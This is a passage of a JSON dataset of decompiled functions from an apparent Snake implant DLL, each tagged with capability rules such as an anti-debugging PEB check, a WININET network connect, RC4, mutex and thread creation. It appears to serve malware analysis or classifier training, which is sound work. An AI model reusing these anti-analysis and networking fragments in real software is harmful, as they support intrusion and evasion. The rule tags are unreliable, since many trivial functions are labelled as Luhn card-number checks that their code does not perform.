        "decompiled_code": "\nvoid __cdecl fcn.2002ab8f(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    uVar2 = *arg_ch & 0xffff;\n    uVar6 = *arg_ch >> 0x10;\n    uVar5 = uVar2 * uVar6 * 0x20000;\n    uVar3 = uVar2 * uVar2 + uVar5;\n    iVar7 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 1;\n    }\n    *arg_8h = uVar3;\n    iVar4 = *(arg_ch + 6) * *(arg_ch + 2);\n    uVar3 = *(arg_ch + 6) * *arg_ch;\n    uVar2 = *(arg_ch + 1) * *(arg_ch + 2) + uVar3;\n    if (uVar2 < uVar3) {\n        iVar4 = iVar4 + 0x10000;\n    }\n    uVar5 = *(arg_ch + 1) * *arg_ch + uVar2 * 0x10000;\n    uVar3 = iVar4 + (uVar2 >> 0x10);\n    if (uVar5 < uVar2 * 0x10000) {\n        uVar3 = uVar3 + 1;\n    }\n    arg_ch = (uVar3 & 0x80000000) != 0;\n    iVar4 = uVar3 * 2;\n    if ((uVar5 & 0x80000000) != 0) {\n        iVar4 = iVar4 + 1;\n    }\n    uVar2 = uVar5 * 2 + iVar7;\n    if ((uVar2 < uVar5 * 2) && (iVar4 = iVar4 + 1,  iVar4 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[1] = uVar2;\n    uVar2 = puVar1[1] & 0xffff;\n    uVar5 = puVar1[1] >> 0x10;\n    uVar6 = uVar2 * uVar5 * 0x20000;\n    uVar3 = uVar2 * uVar2 + uVar6;\n    uVar2 = uVar5 * uVar5 + (uVar2 * uVar5 >> 0xf);\n    if (uVar3 < uVar6) {\n        uVar2 = uVar2 + 1;\n    }\n    if (iVar4 + uVar3 < uVar3) {\n        uVar2 = uVar2 + 1;\n    }\n    var_4h = arg_ch + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 10) * *(puVar1 + 2);\n    uVar6 = *(puVar1 + 10) * *puVar1;\n    uVar5 = *(puVar1 + 2) * *(puVar1 + 2) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 2) * *puVar1 + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_4h = var_4h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = iVar4 + uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    uVar2 = arg_ch + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[2] = uVar3;\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 2);\n    uVar5 = *(puVar1 + 0xe) * *puVar1;\n    uVar3 = *(puVar1 + 3) * *(puVar1 + 2) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 3) * *puVar1 + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_8h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    if (var_4h + uVar5 < uVar5) {\n        var_8h = var_8h + 1;\n    }\n    iVar7 = *(puVar1 + 10) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 10) * *(puVar1 + 1);\n    uVar3 = *(puVar1 + 2) * *(puVar1 + 6) + uVar6;\n    if (uVar3 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 2) * *(puVar1 + 1) + uVar3 * 0x10000;\n    uVar6 = iVar7 + (uVar3 >> 0x10);\n    if (uVar8 < uVar3 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        var_8h = var_8h + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar2 = uVar2 + uVar8 * 2;\n    if ((uVar2 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        var_8h = var_8h + 1;\n    }\n    uVar3 = var_4h + uVar5 + uVar6;\n    if (uVar3 < uVar6) {\n        var_8h = var_8h + 1;\n    }\n    arg_8h[3] = uVar2;\n    uVar2 = puVar1[2] & 0xffff;\n    uVar6 = puVar1[2] >> 0x10;\n    uVar8 = uVar2 * uVar6 * 0x20000;\n    uVar5 = uVar2 * uVar2 + uVar8;\n    uVar2 = uVar6 * uVar6 + (uVar2 * uVar6 >> 0xf);\n    if (uVar5 < uVar8) {\n        uVar2 = uVar2 + 1;\n    }\n    uVar3 = uVar3 + uVar5;\n    if (uVar3 < uVar5) {\n        uVar2 = uVar2 + 1;\n    }\n    arg_ch = var_8h + uVar2 < uVar2;\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 6);\n    uVar6 = *(puVar1 + 0xe) * *(puVar1 + 1);\n    uVar5 = *(puVar1 + 3) * *(puVar1 + 6) + uVar6;\n    if (uVar5 < uVar6) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar8 = *(puVar1 + 3) * *(puVar1 + 1) + uVar5 * 0x10000;\n    uVar6 = iVar7 + (uVar5 >> 0x10);\n    if (uVar8 < uVar5 * 0x10000) {\n        uVar6 = uVar6 + 1;\n    }\n    if ((uVar6 & 0x80000000) != 0) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar6 = uVar6 * 2;\n    if ((uVar8 & 0x80000000) != 0) {\n        uVar6 = uVar6 + 1;\n    }\n    uVar3 = uVar3 + uVar8 * 2;\n    if ((uVar3 < uVar8 * 2) && (uVar6 = uVar6 + 1,  uVar6 == 0)) {\n        arg_ch = arg_ch + 1;\n    }\n    uVar2 = var_8h + uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        arg_ch = arg_ch + 1;\n    }\n    arg_8h[4] = uVar3;\n    iVar7 = *(puVar1 + 0xe) * *(puVar1 + 10);\n    uVar5 = *(puVar1 + 0xe) * *(puVar1 + 2);\n    uVar3 = *(puVar1 + 3) * *(puVar1 + 10) + uVar5;\n    if (uVar3 < uVar5) {\n        iVar7 = iVar7 + 0x10000;\n    }\n    uVar6 = *(puVar1 + 3) * *(puVar1 + 2) + uVar3 * 0x10000;\n    uVar5 = iVar7 + (uVar3 >> 0x10);\n    if (uVar6 < uVar3 * 0x10000) {\n        uVar5 = uVar5 + 1;\n    }\n    var_4h = (uVar5 & 0x80000000) != 0;\n    uVar5 = uVar5 * 2;\n    if ((uVar6 & 0x80000000) != 0) {\n        uVar5 = uVar5 + 1;\n    }\n    uVar2 = uVar2 + uVar6 * 2;\n    if ((uVar2 < uVar6 * 2) && (uVar5 = uVar5 + 1,  uVar5 == 0)) {\n        var_4h = var_4h + 1;\n    }\n    if (arg_ch + uVar5 < uVar5) {\n        var_4h = var_4h + 1;\n    }\n    arg_8h[5] = uVar2;\n    uVar2 = puVar1[3] & 0xffff;\n    uVar3 = puVar1[3] >> 0x10;\n    uVar6 = uVar2 * uVar3 * 0x20000;\n    iVar7 = uVar3 * uVar3 + (uVar2 * uVar3 >> 0xf);\n    uVar2 = uVar2 * uVar2 + uVar6;\n    if (uVar2 < uVar6) {\n        iVar7 = iVar7 + 1;\n    }\n    uVar3 = arg_ch + uVar5 + uVar2;\n    if (uVar3 < uVar2) {\n        iVar7 = iVar7 + 1;\n    }\n    arg_8h[6] = uVar3;\n    arg_8h[7] = iVar7 + var_4h;\n    return;\n}\n",
        "token_count": 2939
    },
    "2001131c": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nuint fcn.2001131c(uint param_1, int32_t param_2, int32_t param_3, uint param_4)\n\n{\n    uint uVar1;\n    uchar auStack164 [15];\n    uint uStack149;\n    uint uStack73;\n    int32_t iStack69;\n    uint uStack65;\n    uint uStack61;\n    \n    sub.ntdll.dll_memset(auStack164, 0, 0x9f);\n    if (param_2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (param_3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        iStack69 = param_3;\n        uStack61 = param_4;\n        uStack65 = 0;\n        uStack73 = 1;\n        uStack149 = param_1;\n        uVar1 = fcn.2001127d();\n    }\n    return uVar1;\n}\n",
        "token_count": 221
    },
    "2002494e": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2002494e(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = arg_ch + (arg_ch >> 0x1f & 0x1fU) >> 5;\n    if (arg_8h[1] == iVar4 || arg_8h[1] < iVar4) {\n        arg_ch_00 = iVar4 + 1;\n        piVar2 = arg_8h;\n        if (arg_8h[2] < arg_ch_00) {\n            piVar2 = fcn.2002456e(arg_8h, arg_ch_00);\n        }\n        if (piVar2 == NULL) {\n            return 0;\n        }\n        for (iVar3 = arg_8h[1]; iVar3 < arg_ch_00; iVar3 = iVar3 + 1) {\n            *(*arg_8h + iVar3 * 4) = 0;\n        }\n        arg_8h[1] = arg_ch_00;\n    }\n    puVar1 = *arg_8h + iVar4 * 4;\n    *puVar1 = *puVar1 | 1 << (arg_ch & 0x1f);\n    return 1;\n}\n",
        "token_count": 316
    },
    "200249bf": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nbool fcn.200249bf(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 < 0) {\n        return false;\n    }\n    iVar1 = (param_2 >> 0x1f & 0x1fU) + param_2 >> 5;\n    if (param_1[1] == iVar1 || param_1[1] < iVar1) {\n        return false;\n    }\n    return (1 << (param_2 & 0x1f) & *(*param_1 + iVar1 * 4)) != 0;\n}\n",
        "token_count": 142
    },
    "2001ee4e": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001ee4e(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = arg_8h;\n    if ((*(arg_8h + 0x58) != 0) && (iVar3 = fcn.2001e958(),  iVar3 != 0)) {\n        return iVar3;\n    }\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x18) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x19) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x1a) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x1b) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x14) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x15) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x16) = uVar2;\n    uVar2 = fcn.200018bf();\n    *(iVar5 + 0x17) = uVar2;\n    sub.ntdll.dll_memset(&var_24h, 0, 0x18);\n    fcn.200012fa(&var_20h);\n    iVar3 = (*_sym.imp.WININET.dll_InternetConnectA)(*(iVar5 + 0xc), *(iVar5 + 4), *(iVar5 + 8), 0, 0, 3, 0, &var_24h);\n    *(iVar5 + 0x10) = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x3e5) && (iVar4 = fcn.200012d6(&var_20h, 60000),  iVar3 = var_24h,  iVar4 == 0x102)) {\n            iVar3 = 0x21590002;\n            if (var_18h == 0) {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(*(iVar5 + 0xc));\n                *(iVar5 + 0xc) = 0;\n            }\n            else {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(var_18h);\n            }\n        }\n    }\n    else {\n        iVar3 = 0;\n    }\n    if (*0x20047050 != 0) {\n        fcn.20001567(0x20047054);\n        if (*0x20047050 != 0) {\n            uVar6 = (*_sym.imp.msvcrt.dll__time64)(0);\n            var_8h = uVar6 >> 0x20;\n            (*_sym.imp.msvcrt.dll_fprintf)\n                      (*0x20047050, \"CO\\tti=%u\\tst=%d\\tso=%x\\tad=%s\\tpo=%u\\n\", uVar6, iVar3, iVar5, *(iVar5 + 4), \n                       *(iVar5 + 8));\n            (*_sym.imp.msvcrt.dll_fflush)(*0x20047050);\n        }\n        fcn.2000157d(0x20047054);\n    }\n    if (iVar3 == 0) {\n        do {\n            iVar3 = fcn.200012e7(&var_20h);\n            if (iVar3 != 0) {\n                fcn.200012a9(&var_20h);\n            }\n            if (var_14h != 0) {\n                (*_sym.imp.WININET.dll_InternetCloseHandle)(&var_14h);\n            }\n            if (*(iVar5 + 0x50) == 0) {\n                iVar3 = fcn.2001db8c(&var_24h, *(iVar5 + 0x18), 1);\n            }\n            else {\n                iVar3 = fcn.2001d84e(*(iVar5 + 0x50), *(iVar5 + 0x54), iVar5, &var_24h, *(iVar5 + 0x18), 3);\n            }\n            if (iVar3 != 0) goto code_r0x2001f0c5;\n            iVar3 = fcn.2001e876(var_14h);\n        } while (iVar3 == 0x2159012c);\n        if (iVar3 == 0) {\n            uVar1 = *(iVar5 + 0x18);\n            *(iVar5 + 0x18) = uVar1 + 1;\n            iVar3 = fcn.2001ddfd(&arg_8h, &var_8h, iVar5, &var_4h, &var_24h, uVar1, 60000);\n            if (iVar3 == 0) {\n                fcn.20019762(iVar5, arg_8h);\n                goto code_r0x2001f0d6;\n            }\n        }\n    }\ncode_r0x2001f0c5:\n    if (*(iVar5 + 0x10) != 0) {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(*(iVar5 + 0x10));\n        *(iVar5 + 0x10) = 0;\n    }\ncode_r0x2001f0d6:\n    iVar5 = fcn.200012e7(&var_20h);\n    if (iVar5 != 0) {\n        fcn.200012a9(&var_20h);\n    }\n    return iVar3;\n}\n",
        "token_count": 1357
    },
    "2000dbc8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.2000dbc8(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint *puVar6;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    uVar1 = *(param_1 + 0x38);\n    uVar5 = *(param_1 + 0x50);\n    uVar2 = fcn.2000dad4(*(param_1 + 0x54), uVar1);\n    uVar3 = *(extraout_ECX + 6);\n    if (uVar3 != 0) {\n        puVar6 = *(extraout_ECX + 0x14) + extraout_ECX + 0x20;\n        do {\n            iVar4 = fcn.2000dad4(*puVar6, uVar1);\n            uVar2 = uVar2 + iVar4;\n            puVar6 = extraout_ECX_00 + 0x28;\n            uVar3 = uVar3 - 1;\n        } while (uVar3 != 0);\n    }\n    if (uVar5 <= uVar2) {\n        uVar5 = uVar2;\n    }\n    return uVar5;\n}\n",
        "token_count": 320
    },
    "2001e637": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2001e637(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    uint var_20h;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h_00 = arg_8h;\n    uVar1 = *(arg_8h + 0x18);\n    *(arg_8h + 0x18) = uVar1 + 1;\n    iVar2 = fcn.2001d84e(arg_ch, arg_10h, arg_8h, &var_20h, uVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = fcn.2001ddfd(&arg_8h, &var_8h, arg_10h_00, &var_4h, &var_20h, uVar1, 60000);\n        if (iVar2 == 0) {\n            fcn.20019762(arg_10h_00, arg_8h);\n            iVar2 = 0;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 273
    },
    "20001588": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create mutex"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20001588(int32_t *s, uint lpName)\n\n{\n    int32_t iVar1;\n    uint lpMutexAttributes;\n    uint var_ch;\n    uint ptr;\n    \n    ptr = 0;\n    sub.ntdll.dll_memset(s, 0, 4);\n    iVar1 = fcn.20001ac0(&ptr);\n    if (iVar1 == 0) {\n        sub.ntdll.dll_memset(&lpMutexAttributes, 0, 0xc);\n        var_ch = ptr;\n        lpMutexAttributes = 0xc;\n        iVar1 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(&lpMutexAttributes, 0, lpName);\n        *s = iVar1;\n        (*_sym.imp.msvcrt.dll_free)(ptr);\n        if (*s == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            iVar1 = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 218
    },
    "20001911": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.20001911(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    sub.ntdll.dll_memset(param_1, 0, 0x34);\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 + 0x14);\n    pcVar1 = _sym.imp.KERNEL32.dll_CreateSemaphoreW;\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0x7fffffff, 0);\n    *(param_1 + 0xc) = uVar2;\n    uVar2 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n    *(param_1 + 0x10) = uVar2;\n    return;\n}\n",
        "token_count": 177
    },
    "20001953": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.20001953(int32_t param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(param_1 + 0xc));\n    (*pcVar1)(*(param_1 + 0x10));\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 0x14);\n    return;\n}\n",
        "token_count": 101
    },
    "20001cfb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.20001cfb(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    iVar1 = (*_sym.imp.msvcrt.dll__beginthreadex)(0, 0, arg_ch, arg_10h, 0, &var_4h);\n    *arg_8h = iVar1;\n    arg_8h[1] = var_4h;\n    return (iVar1 != 0) - 1;\n}\n",
        "token_count": 127
    },
    "2000275f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.2000275f(uint param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = *(param_2 + 0x1c) + param_3;\n    uVar2 = *(param_2 + 0xc);\n    if (uVar2 < uVar3) {\n        uVar1 = *(param_2 + 0x14);\n        uVar2 = (((uVar1 - uVar2) + -1 + uVar3) / uVar1) * uVar1 + uVar2;\n    }\n    return uVar2;\n}\n",
        "token_count": 165
    },
    "2000282f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.2000282f(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + param_1;\n    (**(*(in_EAX + 0x44) + 0x18))(*(in_EAX + 0x48), in_EAX + 8, 0x2c, 0);\n    return;\n}\n",
        "token_count": 105
    },
    "20002bbd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.20002bbd(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if ((in_EAX < 0x40000001) && (param_1 != 0)) {\n        fcn.200026a7();\n        (**(*(param_1 + 0x44) + 0x1c))(*(param_1 + 0x48), 2);\n        iVar1 = (**(*(param_1 + 0x44) + 0xc))(*(param_1 + 0x48));\n        if (iVar1 != 0) {\n            fcn.20002a83();\n            return 0xffffffff;\n        }\n        *(param_1 + 8) = in_EAX;\n        iVar1 = fcn.2000282f();\n        if (iVar1 == 0) {\n            uVar2 = fcn.20002a83();\n            (**(*(param_1 + 0x44) + 0x1c))(*(param_1 + 0x48), 1);\n            return uVar2;\n        }\n    }\n    return 3;\n}\n",
        "token_count": 260
    },
    "20002c2b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20002c2b(uint param_1, uint param_2)\n\n{\n    fcn.2000297f(param_1, param_2, 1);\n    return;\n}\n",
        "token_count": 44
    },
    "20002c3e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20002c3e(uint param_1, uint param_2)\n\n{\n    fcn.2000297f(param_1, param_2, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "20003bfe": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.20003bfe(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *unaff_ESI;\n    int32_t iVar4;\n    \n    if ((unaff_ESI != NULL) && (param_1 != 0)) {\n        iVar4 = *(param_1 + 0x2c) + 0x40;\n        if (unaff_ESI[2] <= unaff_ESI[7] + iVar4 && unaff_ESI[7] + iVar4 != unaff_ESI[2]) {\n            uVar2 = fcn.2000275f(iVar4);\n            if (unaff_ESI[4] <= uVar2) {\n                fcn.20002fbf(*unaff_ESI);\n                uVar2 = fcn.2000275f(iVar4);\n                if (unaff_ESI[4] <= uVar2) {\n                    return 0xffffffff;\n                }\n            }\n            iVar3 = fcn.20002bbd();\n            if (iVar3 != 0) {\n                fcn.20002fbf(*unaff_ESI);\n                iVar3 = fcn.20002bbd();\n                if (iVar3 != 0) {\n                    return 0xffffffff;\n                }\n            }\n        }\n        uVar1 = unaff_ESI[7];\n        iVar3 = (**(unaff_ESI[0x11] + 0x18))(unaff_ESI[0x12], param_1, 0x40, uVar1);\n        if (iVar3 == 0) {\n            unaff_ESI[7] = unaff_ESI[7] + iVar4;\n            unaff_ESI[6] = unaff_ESI[6] + 1;\n            iVar4 = fcn.2000282f();\n            if (iVar4 == 0) {\n                return uVar1;\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 440
    },
    "20004566": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20004566(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.20004198(param_1, param_2, param_3, *0x2003415c);\n    return;\n}\n",
        "token_count": 55
    },
    "20004896": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20004896(uint arg_8h, uint path)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint ptr;\n    int32_t var_8h;\n    int32_t stream;\n    \n    pcVar2 = _sym.imp.msvcrt.dll_fopen;\n    iVar3 = (*_sym.imp.msvcrt.dll_fopen)(arg_8h, 0x2002d518);\n    if (iVar3 != 0) {\n        var_8h = iVar3;\n        stream = (*pcVar2)(path, 0x2002d4d4);\n        pcVar2 = _sym.imp.msvcrt.dll_fread;\n        if (stream != 0) {\n            do {\n                iVar5 = (*pcVar2)(&ptr, 1, 0x800, iVar3);\n                pcVar1 = _sym.imp.msvcrt.dll_fclose;\n                if (iVar5 == 0) {\n                    (*_sym.imp.msvcrt.dll_fclose)(var_8h);\n                    (*pcVar1)(stream);\n                    return 0;\n                }\n                iVar4 = (*_sym.imp.msvcrt.dll_fwrite)(&ptr, 1, iVar5, stream);\n                pcVar1 = _sym.imp.msvcrt.dll_fclose;\n                iVar3 = var_8h;\n            } while (iVar4 == iVar5);\n            (*_sym.imp.msvcrt.dll_fclose)();\n            (*pcVar1)(stream);\n            (*_sym.imp.msvcrt.dll__unlink)(path);\n            return 0xffffffff;\n        }\n        (*_sym.imp.msvcrt.dll_fclose)(iVar3);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 390
    },
    "20004956": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.20004956(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    pcVar1 = _sym.imp.ntdll.dll_strrchr;\n    uVar2 = (*_sym.imp.ntdll.dll_strrchr)(param_1, 0x2e);\n    uVar3 = (*pcVar1)(param_1, 0x5c);\n    if (((uVar2 != 0) && (uVar3 != 0)) && (uVar2 < uVar3)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 148
    },
    "20004986": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20004986(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x20046c64 != 0) {\n        sym.inj_snake_Win32.dll_snake_log(10, 0, 0, 0, 0);\n        *0x200471c8 = 1;\n        iVar1 = fcn.200012e7(0x20047208);\n        if (iVar1 != 0) {\n            fcn.200012c9(0x20047208);\n            if (*0x200471b4 != 0) {\n                sym.inj_snake_Win32.dll_t_close(0x200471b4, 0);\n            }\n            fcn.200012d6(0x200471b8, 0xffffffff);\n            fcn.20001d2f(0x20046c24);\n            fcn.200012a9(0x20047208);\n            fcn.200012a9(0x200471b8);\n        }\n        iVar1 = fcn.200012e7(0x200471c0);\n        if (iVar1 != 0) {\n            fcn.200012c9(0x200471c0);\n            fcn.200012d6(0x20047328, 0xffffffff);\n            fcn.20001d2f(0x20046c54);\n            fcn.200012a9(0x200471c0);\n            fcn.200012a9(0x20047328);\n        }\n        iVar1 = fcn.200012e7(*0x20047330);\n        if (iVar1 != 0) {\n            iVar1 = fcn.200012e7(0x200471d0);\n            if (iVar1 != 0) {\n                fcn.200012c9(*0x20047330);\n                fcn.200012d6(0x200471d0, 0xffffffff);\n                fcn.20001d2f(0x20046c5c);\n                fcn.200012a9(0x200471d0);\n            }\n        }\n        fcn.200045cf();\n        fcn.2000ae9e();\n        fcn.20009394();\n        fcn.20006404();\n        fcn.2000be36();\n        fcn.20009cd0();\n        fcn.200081ef();\n        sym.inj_snake_Win32.dll_tm_free();\n        fcn.2000a9d9(0xfffffffe);\n        fcn.2000ae89();\n        sym.inj_snake_Win32.dll_snake_log(0xb, 0, 0, 0, 0);\n        fcn.20003e6b();\n        *0x20046c64 = 0;\n    }\n    return;\n}\n",
        "token_count": 623
    },
    "20004ad3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
